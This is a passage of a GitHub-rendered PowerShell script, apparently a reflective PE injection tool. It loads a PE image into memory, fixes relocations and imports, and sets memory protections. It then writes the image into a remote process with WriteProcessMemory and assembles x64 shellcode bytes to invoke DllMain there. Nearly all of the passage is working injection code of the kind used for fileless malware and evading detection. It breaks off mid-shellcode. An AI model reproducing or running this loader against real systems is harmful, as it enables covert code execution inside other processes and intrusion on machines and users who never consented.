          <td id="L2489" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2489"></td>
          <td id="LC2489" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2490" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2490"></td>
          <td id="LC2490" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$PEEndAddress</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> (<span class="pl-smi">$PEHandle</span>) ([<span class="pl-k">Int64</span>]<span class="pl-smi">$PEInfo<span class="pl-smi">.SizeOfImage</span></span>)</td>
        </tr>
        <tr>
          <td id="L2491" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2491"></td>
          <td id="LC2491" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$PEHandle</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L2492" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2492"></td>
          <td id="LC2492" class="blob-code blob-code-inner js-file-line">		{ </td>
        </tr>
        <tr>
          <td id="L2493" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2493"></td>
          <td id="LC2493" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free).<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2494" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2494"></td>
          <td id="LC2494" class="blob-code blob-code-inner js-file-line">		}		</td>
        </tr>
        <tr>
          <td id="L2495" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2495"></td>
          <td id="LC2495" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::Copy(<span class="pl-smi">$PEBytes</span><span class="pl-k">,</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-smi">$PEHandle</span><span class="pl-k">,</span> <span class="pl-smi">$PEInfo<span class="pl-smi">.SizeOfHeaders</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L2496" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2496"></td>
          <td id="LC2496" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2497" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2497"></td>
          <td id="LC2497" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2498" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2498"></td>
          <td id="LC2498" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Now that the PE is in memory, get more detailed information about it</span></td>
        </tr>
        <tr>
          <td id="L2499" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2499"></td>
          <td id="LC2499" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">Write-Verbose</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Getting detailed PE information from the headers loaded in memory<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2500" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2500"></td>
          <td id="LC2500" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEInfo</span> <span class="pl-k">=</span> <span class="pl-c1">Get-PEDetailedInfo</span> <span class="pl-k">-</span>PEHandle <span class="pl-smi">$PEHandle</span> <span class="pl-k">-</span>Win32Types <span class="pl-smi">$Win32Types</span> <span class="pl-k">-</span>Win32Constants <span class="pl-smi">$Win32Constants</span></td>
        </tr>
        <tr>
          <td id="L2501" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2501"></td>
          <td id="LC2501" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEInfo</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name EndAddress <span class="pl-k">-</span>Value <span class="pl-smi">$PEEndAddress</span></td>
        </tr>
        <tr>
          <td id="L2502" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2502"></td>
          <td id="LC2502" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEInfo</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name EffectivePEHandle <span class="pl-k">-</span>Value <span class="pl-smi">$EffectivePEHandle</span></td>
        </tr>
        <tr>
          <td id="L2503" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2503"></td>
          <td id="LC2503" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">Write-Verbose</span> <span class="pl-s"><span class="pl-pds">&quot;</span>StartAddress: <span class="pl-k"><span class="pl-pse">$</span></span><span class="pl-pse">(</span><span class="pl-c1">Get-Hex</span> <span class="pl-smi">$PEHandle</span><span class="pl-pse">)</span>    EndAddress: <span class="pl-k"><span class="pl-pse">$</span></span><span class="pl-pse">(</span><span class="pl-c1">Get-Hex</span> <span class="pl-smi">$PEEndAddress</span><span class="pl-pse">)</span><span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2504" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2504"></td>
          <td id="LC2504" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2505" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2505"></td>
          <td id="LC2505" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2506" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2506"></td>
          <td id="LC2506" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Copy each section from the PE in to memory</span></td>
        </tr>
        <tr>
          <td id="L2507" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2507"></td>
          <td id="LC2507" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">Write-Verbose</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Copy PE sections in to memory<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2508" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2508"></td>
          <td id="LC2508" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">Copy-Sections</span> <span class="pl-k">-</span>PEBytes <span class="pl-smi">$PEBytes</span> <span class="pl-k">-</span>PEInfo <span class="pl-smi">$PEInfo</span> <span class="pl-k">-</span>Win32Functions <span class="pl-smi">$Win32Functions</span> <span class="pl-k">-</span>Win32Types <span class="pl-smi">$Win32Types</span></td>
        </tr>
        <tr>
          <td id="L2509" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2509"></td>
          <td id="LC2509" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2510" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2510"></td>
          <td id="LC2510" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2511" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2511"></td>
          <td id="LC2511" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded</span></td>
        </tr>
        <tr>
          <td id="L2512" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2512"></td>
          <td id="LC2512" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">Write-Verbose</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Update memory addresses based on where the PE was actually loaded in memory<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2513" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2513"></td>
          <td id="LC2513" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">Update-MemoryAddresses</span> <span class="pl-k">-</span>PEInfo <span class="pl-smi">$PEInfo</span> <span class="pl-k">-</span>OriginalImageBase <span class="pl-smi">$OriginalImageBase</span> <span class="pl-k">-</span>Win32Constants <span class="pl-smi">$Win32Constants</span> <span class="pl-k">-</span>Win32Types <span class="pl-smi">$Win32Types</span></td>
        </tr>
        <tr>
          <td id="L2514" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2514"></td>
          <td id="LC2514" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2515" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2515"></td>
          <td id="LC2515" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2516" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2516"></td>
          <td id="LC2516" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>The PE we are in-memory loading has DLLs it needs, import those DLLs for it</span></td>
        </tr>
        <tr>
          <td id="L2517" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2517"></td>
          <td id="LC2517" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">Write-Verbose</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Import DLL&#39;s needed by the PE we are loading<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2518" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2518"></td>
          <td id="LC2518" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$RemoteLoading</span> <span class="pl-k">-eq</span> <span class="pl-c1">$true</span>)</td>
        </tr>
        <tr>
          <td id="L2519" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2519"></td>
          <td id="LC2519" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2520" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2520"></td>
          <td id="LC2520" class="blob-code blob-code-inner js-file-line">			<span class="pl-c1">Import-DllImports</span> <span class="pl-k">-</span>PEInfo <span class="pl-smi">$PEInfo</span> <span class="pl-k">-</span>Win32Functions <span class="pl-smi">$Win32Functions</span> <span class="pl-k">-</span>Win32Types <span class="pl-smi">$Win32Types</span> <span class="pl-k">-</span>Win32Constants <span class="pl-smi">$Win32Constants</span> <span class="pl-k">-</span>RemoteProcHandle <span class="pl-smi">$RemoteProcHandle</span></td>
        </tr>
        <tr>
          <td id="L2521" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2521"></td>
          <td id="LC2521" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2522" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2522"></td>
          <td id="LC2522" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L2523" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2523"></td>
          <td id="LC2523" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2524" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2524"></td>
          <td id="LC2524" class="blob-code blob-code-inner js-file-line">			<span class="pl-c1">Import-DllImports</span> <span class="pl-k">-</span>PEInfo <span class="pl-smi">$PEInfo</span> <span class="pl-k">-</span>Win32Functions <span class="pl-smi">$Win32Functions</span> <span class="pl-k">-</span>Win32Types <span class="pl-smi">$Win32Types</span> <span class="pl-k">-</span>Win32Constants <span class="pl-smi">$Win32Constants</span></td>
        </tr>
        <tr>
          <td id="L2525" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2525"></td>
          <td id="LC2525" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2526" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2526"></td>
          <td id="LC2526" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2527" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2527"></td>
          <td id="LC2527" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2528" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2528"></td>
          <td id="LC2528" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Update the memory protection flags for all the memory just allocated</span></td>
        </tr>
        <tr>
          <td id="L2529" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2529"></td>
          <td id="LC2529" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$RemoteLoading</span> <span class="pl-k">-eq</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L2530" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2530"></td>
          <td id="LC2530" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2531" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2531"></td>
          <td id="LC2531" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$NXCompatible</span> <span class="pl-k">-eq</span> <span class="pl-c1">$true</span>)</td>
        </tr>
        <tr>
          <td id="L2532" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2532"></td>
          <td id="LC2532" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2533" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2533"></td>
          <td id="LC2533" class="blob-code blob-code-inner js-file-line">				<span class="pl-c1">Write-Verbose</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Update memory protection flags<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2534" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2534"></td>
          <td id="LC2534" class="blob-code blob-code-inner js-file-line">				<span class="pl-c1">Update-MemoryProtectionFlags</span> <span class="pl-k">-</span>PEInfo <span class="pl-smi">$PEInfo</span> <span class="pl-k">-</span>Win32Functions <span class="pl-smi">$Win32Functions</span> <span class="pl-k">-</span>Win32Constants <span class="pl-smi">$Win32Constants</span> <span class="pl-k">-</span>Win32Types <span class="pl-smi">$Win32Types</span></td>
        </tr>
        <tr>
          <td id="L2535" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2535"></td>
          <td id="LC2535" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2536" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2536"></td>
          <td id="LC2536" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L2537" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2537"></td>
          <td id="LC2537" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2538" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2538"></td>
          <td id="LC2538" class="blob-code blob-code-inner js-file-line">				<span class="pl-c1">Write-Verbose</span> <span class="pl-s"><span class="pl-pds">&quot;</span>PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2539" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2539"></td>
          <td id="LC2539" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2540" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2540"></td>
          <td id="LC2540" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2541" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2541"></td>
          <td id="LC2541" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L2542" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2542"></td>
          <td id="LC2542" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2543" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2543"></td>
          <td id="LC2543" class="blob-code blob-code-inner js-file-line">			<span class="pl-c1">Write-Verbose</span> <span class="pl-s"><span class="pl-pds">&quot;</span>PE being loaded in to a remote process, not adjusting memory permissions<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2544" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2544"></td>
          <td id="LC2544" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2545" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2545"></td>
          <td id="LC2545" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2546" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2546"></td>
          <td id="LC2546" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2547" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2547"></td>
          <td id="LC2547" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>If remote loading, copy the DLL in to remote process memory</span></td>
        </tr>
        <tr>
          <td id="L2548" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2548"></td>
          <td id="LC2548" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$RemoteLoading</span> <span class="pl-k">-eq</span> <span class="pl-c1">$true</span>)</td>
        </tr>
        <tr>
          <td id="L2549" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2549"></td>
          <td id="LC2549" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2550" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2550"></td>
          <td id="LC2550" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">UInt32</span>]<span class="pl-smi">$NumBytesWritten</span> <span class="pl-k">=</span> <span class="pl-c1">0</span></td>
        </tr>
        <tr>
          <td id="L2551" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2551"></td>
          <td id="LC2551" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$Success</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.WriteProcessMemory.Invoke</span></span>(<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span> <span class="pl-smi">$EffectivePEHandle</span><span class="pl-k">,</span> <span class="pl-smi">$PEHandle</span><span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>](<span class="pl-smi">$PEInfo<span class="pl-smi">.SizeOfImage</span></span>)<span class="pl-k">,</span> [<span class="pl-k">Ref</span>]<span class="pl-smi">$NumBytesWritten</span>)</td>
        </tr>
        <tr>
          <td id="L2552" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2552"></td>
          <td id="LC2552" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$Success</span> <span class="pl-k">-eq</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L2553" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2553"></td>
          <td id="LC2553" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2554" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2554"></td>
          <td id="LC2554" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Unable to write shellcode to remote process memory.<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2555" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2555"></td>
          <td id="LC2555" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2556" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2556"></td>
          <td id="LC2556" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2557" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2557"></td>
          <td id="LC2557" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2558" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2558"></td>
          <td id="LC2558" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2559" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2559"></td>
          <td id="LC2559" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function</span></td>
        </tr>
        <tr>
          <td id="L2560" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2560"></td>
          <td id="LC2560" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$PEInfo<span class="pl-smi">.FileType</span></span> <span class="pl-k">-ieq</span> <span class="pl-s"><span class="pl-pds">&quot;</span>DLL<span class="pl-pds">&quot;</span></span>)</td>
        </tr>
        <tr>
          <td id="L2561" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2561"></td>
          <td id="LC2561" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2562" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2562"></td>
          <td id="LC2562" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$RemoteLoading</span> <span class="pl-k">-eq</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L2563" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2563"></td>
          <td id="LC2563" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2564" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2564"></td>
          <td id="LC2564" class="blob-code blob-code-inner js-file-line">				<span class="pl-c1">Write-Verbose</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Calling dllmain so the DLL knows it has been loaded<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2565" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2565"></td>
          <td id="LC2565" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$DllMainPtr</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> (<span class="pl-smi">$PEInfo<span class="pl-smi">.PEHandle</span></span>) (<span class="pl-smi">$PEInfo<span class="pl-smi">.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint</span></span>)</td>
        </tr>
        <tr>
          <td id="L2566" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2566"></td>
          <td id="LC2566" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$DllMainDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]) ([<span class="pl-k">Bool</span>])</td>
        </tr>
        <tr>
          <td id="L2567" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2567"></td>
          <td id="LC2567" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$DllMain</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$DllMainPtr</span><span class="pl-k">,</span> <span class="pl-smi">$DllMainDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L2568" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2568"></td>
          <td id="LC2568" class="blob-code blob-code-inner js-file-line">				</td>
        </tr>
        <tr>
          <td id="L2569" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2569"></td>
          <td id="LC2569" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$DllMain<span class="pl-smi">.Invoke</span></span>(<span class="pl-smi">$PEInfo<span class="pl-smi">.PEHandle</span></span><span class="pl-k">,</span> <span class="pl-c1">1</span><span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]::Zero) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L2570" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2570"></td>
          <td id="LC2570" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2571" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2571"></td>
          <td id="LC2571" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L2572" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2572"></td>
          <td id="LC2572" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2573" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2573"></td>
          <td id="LC2573" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$DllMainPtr</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> (<span class="pl-smi">$EffectivePEHandle</span>) (<span class="pl-smi">$PEInfo<span class="pl-smi">.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint</span></span>)</td>
        </tr>
        <tr>
          <td id="L2574" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2574"></td>
          <td id="LC2574" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L2575" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2575"></td>
          <td id="LC2575" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">if</span> (<span class="pl-smi">$PEInfo<span class="pl-smi">.PE64Bit</span></span> <span class="pl-k">-eq</span> <span class="pl-c1">$true</span>)</td>
        </tr>
        <tr>
          <td id="L2576" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2576"></td>
          <td id="LC2576" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L2577" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2577"></td>
          <td id="LC2577" class="blob-code blob-code-inner js-file-line">					<span class="pl-c"><span class="pl-c">#</span>Shellcode: CallDllMain.asm</span></td>
        </tr>
        <tr>
          <td id="L2578" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2578"></td>
          <td id="LC2578" class="blob-code blob-code-inner js-file-line">					<span class="pl-smi">$CallDllMainSC1</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0x53</span><span class="pl-k">,</span> <span class="pl-c1">0x48</span><span class="pl-k">,</span> <span class="pl-c1">0x89</span><span class="pl-k">,</span> <span class="pl-c1">0xe3</span><span class="pl-k">,</span> <span class="pl-c1">0x66</span><span class="pl-k">,</span> <span class="pl-c1">0x83</span><span class="pl-k">,</span> <span class="pl-c1">0xe4</span><span class="pl-k">,</span> <span class="pl-c1">0x00</span><span class="pl-k">,</span> <span class="pl-c1">0x48</span><span class="pl-k">,</span> <span class="pl-c1">0xb9</span>)</td>
        </tr>
        <tr>
          <td id="L2579" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2579"></td>
          <td id="LC2579" class="blob-code blob-code-inner js-file-line">					<span class="pl-smi">$CallDllMainSC2</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0xba</span><span class="pl-k">,</span> <span class="pl-c1">0x01</span><span class="pl-k">,</span> <span class="pl-c1">0x00</span><span class="pl-k">,</span> <span class="pl-c1">0x00</span><span class="pl-k">,</span> <span class="pl-c1">0x00</span><span class="pl-k">,</span> <span class="pl-c1">0x41</span><span class="pl-k">,</span> <span class="pl-c1">0xb8</span><span class="pl-k">,</span> <span class="pl-c1">0x00</span><span class="pl-k">,</span> <span class="pl-c1">0x00</span><span class="pl-k">,</span> <span class="pl-c1">0x00</span><span class="pl-k">,</span> <span class="pl-c1">0x00</span><span class="pl-k">,</span> <span class="pl-c1">0x48</span><span class="pl-k">,</span> <span class="pl-c1">0xb8</span>)</td>
        </tr>
        <tr>
          <td id="L2580" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2580"></td>
